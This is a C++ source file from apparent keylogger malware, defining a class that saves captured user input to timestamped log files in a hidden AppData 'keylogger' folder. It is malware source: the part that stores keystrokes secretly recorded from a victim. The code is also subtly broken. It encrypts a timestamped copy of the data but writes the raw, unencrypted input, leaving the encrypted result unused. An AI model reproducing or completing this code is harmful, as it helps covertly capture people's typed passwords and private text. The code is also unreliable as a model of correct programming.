#include "UserInputEncryptedFileLogger.h"

#include <utility>

#include "KeyloggerDirectoryLocator.h"
#include "TimestampFetcher.h"
#include "exceptions/FileNotFound.h"

namespace keylogger
{

UserInputEncryptedFileLogger::UserInputEncryptedFileLogger(
    std::shared_ptr<FileSystemAccess> fileSystemAccessInit, std::unique_ptr<Encryptor> encryptorInit)
    : fileSystemAccess{std::move(fileSystemAccessInit)}, encryptor{std::move(encryptorInit)}
{
}

std::string
UserInputEncryptedFileLogger::writeLogToNewlyCreatedFileBasedOnCurrentTime(const std::string& data)
{
    std::string path = KeyloggerDirectoryLocator::getAppDataKeyloggerPath(true);
    std::string name = TimestampFetcher::getFormattedTimestamp("_") + ".log";

    try
    {
        const std::string logData = "[" + TimestampFetcher::getFormattedTimestamp() + "]" + "\n" + data;
        std::string encryptedData = encryptor->encrypt(logData);
        fileSystemAccess->tryToWrite(path + name, data);
        return name;
    }
    catch (const exceptions::FileNotFound&)
    {
        return {};
    }
}
}